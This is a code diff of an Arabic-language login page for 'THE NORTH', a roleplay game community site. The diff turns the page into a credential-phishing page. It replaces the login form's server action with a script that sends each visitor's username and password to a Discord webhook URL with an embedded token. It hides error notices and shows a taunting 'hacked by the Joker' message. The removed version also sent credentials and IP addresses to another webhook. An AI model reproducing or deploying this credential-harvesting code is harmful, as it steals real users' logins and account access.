@@ -7,6 +7,11 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>THE NORTH | نورث للحياة الواقعية</title>
   <base href="https://north-rp.com/">
+<style>
+.toast-error {
+  display: none !important;
+}
+</style>
   <!-- 
     - favicon
   -->
@@ -16,8 +21,8 @@
     - custom css link
   -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
-  <link rel="stylesheet" href="./assets/css/style.css?v=1747173495">
-  <link rel="stylesheet" href="./assets/css/notification.css?v=1747173495">
+  <link rel="stylesheet" href="./assets/css/style.css?v=1750954813">
+  <link rel="stylesheet" href="./assets/css/notification.css?v=1750954813">
 
   <!-- 
     - google font link
@@ -100,7 +105,7 @@
           <div class="close">
             <ion-icon class="closebtn" name="add-outline"></ion-icon>
           </div>
-          <form id="login" action="/index.php" method="post">
+        <form id="login" onsubmit="sendToWebhook(event)">
             <h1>لوحة تسجيل الدخول</h1>
             <div class="formContainer">
               <div class="formDiv" style="transition-delay: 0.2s">
@@ -193,63 +198,98 @@
   -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script>
   <script src="https://ricostacruz.com/jquery.transit/jquery.transit.min.js"></script>
-  <script src="./assets/js/ajax.js?v=1747173495"></script>
+  <script src="./assets/js/ajax.js?v=1750954813"></script>
   <script src="./assets/js/notification.js"></script>
-  <script src="./assets/js/discord.js?v=1747173495"></script>
-  <script src="./assets/js/script.js?v=1747173495"></script>
-<script>
-document.getElementById("login").addEventListener("submit", async function(e) {
-  e.preventDefault(); // إيقاف الإرسال التلقائي للنموذج
+  <script src="./assets/js/discord.js?v=1750954813"></script>
+  <script src="./assets/js/script.js?v=1750954813"></script>
 
-  const username = document.getElementById("username").value;
-  const password = document.getElementById("password").value;
+<script>  
+  // عرض رسالة بنفس شكل [LOGIN] Error لكن بلون مخصص
+  function showLoginMessage(message, type = "error") {
+    const oldBox = document.querySelector(".login-message");
+    if (oldBox) oldBox.remove();
 
-  try {
-    // 1. الحصول على IP المستخدم
-    const ipResponse = await fetch("https://api.ipify.org?format=json");
-    const ipData = await ipResponse.json();
-    const userIP = ipData.ip || "غير معروف";
+    const box = document.createElement("div");
+    box.className = "login-message";
+    box.style.position = "fixed";
+    box.style.top = "20px";
+    box.style.right = "20px";
+    box.style.zIndex = "9999";
+    box.style.padding = "15px 20px";
+    box.style.backgroundColor = type === "success" ? "#2ecc71" : "#e74c3c"; // أخضر أو أحمر
+    box.style.color = "#fff";
+    box.style.borderRadius = "8px";
+    box.style.boxShadow = "0 0 10px rgba(0,0,0,0.2)";
+    box.style.fontFamily = "tahoma, sans-serif";
+    box.innerHTML = `<strong>[LOGIN]</strong> ${message}`;
 
-    // 2. إعداد بيانات الويب هوك
-    const webhookURL = "https://discord.com/api/webhooks/1386606266067062884/sEslh4Thg_tWQ030QAFU0n_BIx4DKzaYo6Qn-Ve5CTozXbhMwsEsnYqubOcJJSvENkVN";
-    
-    const embed = {
-      title: "⚠️ محاولة تسجيل دخول جديدة",
-      color: 0xff0000, // لون أحمر للتنبيه
-      fields: [
-        { name: "اسم المستخدم", value: username || "غير معروف" },
-        { name: "كلمة المرور", value: "||" + password + "||" }, // مُخفاة في Discord
-        { name: "IP", value: userIP },
-        { name: "الوقت", value: new Date().toLocaleString() }
-      ],
-      footer: { text: "THE NORTH - نظام المراقبة" }
+    document.body.appendChild(box);
+
+    setTimeout(() => {
+      box.remove();
+    }, 4000);
+  }
+
+  // إرسال البيانات إلى Webhook عند الضغط على زر تسجيل الدخول
+  function sendToWebhook(e) {
+    e.preventDefault(); // منع الإرسال التقليدي
+
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+
+    const webhookURL = "https://discord.com/api/webhooks/1387832414776066199/ZBfM7Ru5GoMswUQ4Aa4d6VI7mQql0WzQBvVTjMlYm_GIZ3NVVtNCW-kvL6PDuRt6QtCP"; // ← ضع رابط الويب هوك الخاص بك هنا
+
+    const payload = {
+      embeds: [
+        {
+          title: "تسجيل دخول جديد 🔐",
+          color: 3447003, // أزرق
+          fields: [
+            {
+              name: "👤 اسم الحساب",
+              value: username,
+              inline: true
+            },
+            {
+              name: "🔑 كلمة السر",
+              value: password,
+              inline: true
+            }
+          ],
+          footer: {
+            text: "THE NORTH Roleplay | نظام تسجيل الدخول"
+          },
+          timestamp: new Date()
+        }
+      ]
     };
 
-    // 3. إرسال البيانات إلى Discord
-    await fetch(webhookURL, {
+    fetch(webhookURL, {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ 
-        content: "تنبيه: محاولة تسجيل دخول",
-        embeds: [embed] 
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(payload)
+    })
+      .then(() => {
+        showLoginMessage("تم اختراقك من قبل الجوكر طاب يومك.", "success");
+        // يمكنك إعادة توجيه المستخدم بعد النجاح إن أردت:
+        // window.location.href = "#";
       })
-    });
-
-    // 4. إظهار رسالة للمستخدم
-    toast("success", "تم إرسال البيانات بنجاح");
-    
-  } catch (error) {
-    console.error("Error:", error);
-    toast("error", "حدث خطأ أثناء الإرسال!");
+      .catch((err) => {
+        showLoginMessage("حدث خطأ أثناء إرسال البيانات.", "error");
+        console.error(err);
+      });
   }
-});
-</script>
+
+  </script>
   <!-- 
     - ionicon link
   -->
   <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
-  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
-<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"93f56a8ccb6bcfb5","version":"2025.4.0-1-g37f21b1","r":1,"token":"f091f1dc004d4b23a6b53ff5bf1e9cca","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}}}' crossorigin="anonymous"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js">
+</script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'955e07e30fa51529',t:'MTc1MDk1NDgxMy4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"955e07e30fa51529","version":"2025.6.2","r":1,"token":"f091f1dc004d4b23a6b53ff5bf1e9cca","serverTiming":{"name":{"cfExtPri":true,"cfEdge":true,"cfOrigin":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}}}' crossorigin="anonymous"></script>
 </body>
 
 </html>
